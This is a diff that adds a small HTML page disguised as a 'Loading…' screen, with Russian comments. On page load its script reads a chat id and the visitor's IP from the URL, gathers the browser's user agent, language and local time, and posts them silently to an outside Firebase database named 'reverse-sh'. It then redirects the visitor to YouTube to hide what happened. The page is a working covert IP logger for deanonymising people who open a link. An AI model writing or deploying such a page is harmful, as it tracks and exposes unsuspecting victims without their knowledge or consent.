@@ -1,0 +1,24 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>Loading…</title></head><body>
+<script>
+  // 1. Параметры из URL
+  const p = new URLSearchParams(location.search);
+  const chatId = p.get('c');
+  const ip = p.get('ip');          // ← реальный IP из GitHub-перенаправления
+  const ua = navigator.userAgent;
+  const lang = navigator.language;
+  const now = new Date().toLocaleString("ru-RU");
+
+  // 2. Пишем в RTDB через REST (без SDK)
+  fetch(
+    `https://reverse-sh-default-rtdb.europe-west1.firebasedatabase.app/users/${chatId}/hits.json`,
+    {
+      method: "POST",
+      body: JSON.stringify({ ip: ip, ua: ua, lang: lang, time: now })
+    }
+  );
+
+  // 3. Уходим на легитимный сайт
+  location.replace("https://youtube.com");
+</script>
+</body></html>
